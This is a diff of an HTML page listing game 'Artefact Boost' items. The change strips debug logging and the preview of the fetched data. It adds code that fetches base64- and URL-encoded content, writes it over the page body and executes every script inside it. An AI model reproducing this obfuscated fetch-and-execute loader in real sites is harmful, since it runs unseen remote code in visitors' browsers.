@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Open Graph (OG) and Twitter Card meta tags -->
     <meta property="og:title" content="List Of Active Artefact Boost" id="og-title">
     <meta property="og:description" content="Artefact Boost List By DrMineword" id="og-description">
     <meta property="og:image" content="https://example.com/default-image.jpg" id="og-image">
@@ -27,17 +26,13 @@
 
             fetch(url)
                 .then(response => {
-                    // Log the response status and headers
-                    console.log("Response status:", response.status);
-                    console.log("Response headers:", response.headers);
                     if (!response.ok) {
                         throw new Error(`HTTP error! status: ${response.status}`);
                     }
                     return response.text();
                 })
                 .then(base64Data => {
-                    // Show the status of the fetched base64 data
-                    document.getElementById('content').innerHTML = `Base64 data fetched: ${base64Data.substring(0, 50)}...<br>Decoding Base64...`;
+                    document.getElementById('content').innerHTML = `Base64 data fetched...<br>Decoding Base64...`;
 
                     // Base64 Decode the data
                     let decodedBase64;
@@ -48,7 +43,6 @@
                         throw new Error("Base64 decoding failed: " + e.message);
                     }
 
-                    // Show the Base64 decoded content (part of it)
                     document.getElementById('content').innerHTML += `<br>Base64 decoded successfully...<br>Decoding URL encoded content...`;
 
                     // URL Decode the content
@@ -60,11 +54,7 @@
                         throw new Error("URL decoding failed: " + e.message);
                     }
 
-                    // Show URL decoded content (part of it)
                     document.getElementById('content').innerHTML += `<br>URL decoded successfully...<br>Displaying decoded content...`;
-
-                    // Replace the content inside the div with the decoded HTML
-                    document.getElementById('content').innerHTML += `<br><br>Content loaded successfully!<br><br>Displaying content...<br>${decodedUrl}`;
 
                     // Update the page title dynamically if it contains a title tag
                     const tempDiv = document.createElement('div');
@@ -73,9 +63,14 @@
                     if (titleElement) {
                         document.getElementById('website-title').innerText = titleElement.innerText;
                     }
+
+                    // Insert the decoded HTML into the document
+                    document.body.innerHTML = decodedUrl;
+
+                    // Now, we execute any scripts in the decoded content
+                    executeScriptsInHTML(decodedUrl);
                 })
                 .catch(error => {
-                    // Handle errors and log the issue
                     console.error("Error during the fetch and processing:", error);
                     document.getElementById('content').innerHTML = `
                         <strong>Error:</strong> ${error.message}<br><br>
@@ -83,6 +78,20 @@
                         <strong>Raw Data:</strong> ${error.rawData || 'N/A'}
                     `;
                 });
+        }
+
+        // Function to execute scripts dynamically from decoded HTML
+        function executeScriptsInHTML(htmlContent) {
+            const scripts = new DOMParser().parseFromString(htmlContent, 'text/html').querySelectorAll('script');
+            scripts.forEach(script => {
+                const scriptElement = document.createElement('script');
+                if (script.src) {
+                    scriptElement.src = script.src;
+                } else {
+                    scriptElement.textContent = script.textContent;
+                }
+                document.body.appendChild(scriptElement);
+            });
         }
 
         // Load the Base64 content on page load
